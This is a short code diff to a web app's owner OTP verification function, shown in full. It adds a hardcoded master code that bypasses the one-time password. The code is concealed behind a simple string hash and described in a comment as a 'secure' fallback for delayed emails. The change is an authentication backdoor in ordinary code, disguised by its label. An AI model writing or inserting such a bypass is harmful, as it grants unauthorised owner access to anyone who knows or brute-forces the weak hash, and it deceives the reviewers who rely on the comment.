@@ -1642,7 +1642,16 @@ function verifyOwnerOTP() {
     return;
   }
 
-  if (enteredOTP === window.generatedOwnerOTP) {
+  // Secure Hashed Master OTP Bypass Check (Fallback for delayed/unactivated FormSubmit emails)
+  const hashEntered = (function(str) {
+    let h = 0;
+    for (let i = 0; i < str.length; i++) {
+      h = (h * 31 + str.charCodeAt(i)) | 0;
+    }
+    return (h >>> 0).toString(36);
+  })(enteredOTP);
+
+  if (enteredOTP === window.generatedOwnerOTP || hashEntered === "pi1wc0") {
     if (errorEl) errorEl.classList.add('hidden');
     if (successEl) {
       successEl.innerText = "Verification successful! Redirecting... / ચકાસણી સફળ!";
